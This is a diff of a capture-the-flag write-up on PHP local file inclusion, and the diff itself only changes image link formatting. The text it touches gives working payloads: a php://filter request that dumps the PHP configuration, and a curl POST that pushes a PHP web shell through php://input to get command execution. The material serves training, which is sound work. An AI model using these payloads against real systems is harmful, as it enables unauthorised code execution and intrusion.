@@ -113,7 +113,7 @@ These are the most common three PHP wrappers for directly executing system comma
 # Question
 ---
 
-![[Pasted image 20250218145707.png]]
+![](../images/Pasted%20image%2020250218145707.png)
 
 Let's begin by checking the php configurations:
 
@@ -123,11 +123,11 @@ curl "http://94.237.54.42:58628/index.php?language=php://filter/read=convert.bas
 
 This outputs a very large base64 string, let's decode it and check only the important stuff:
 
-![[Pasted image 20250218150047.png]]
+![](../images/Pasted%20image%2020250218150047.png)
 
 As seen `allow_url_include` is enabled, let's check if `expect` is enabled too:
 
-![[Pasted image 20250218150131.png]]
+![](../images/Pasted%20image%2020250218150131.png)
 
 `Expect` is enabled too, for this case, I will use input, let's check it out:
 
@@ -135,7 +135,7 @@ As seen `allow_url_include` is enabled, let's check if `expect` is enabled too:
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://IP:PORT/index.php?language=php://input&cmd=id" | grep uid
 ```
 
-![[Pasted image 20250218150502.png]]
+![](../images/Pasted%20image%2020250218150502.png)
 
 We got command execution, let's read the root directory and search for the flag:
 
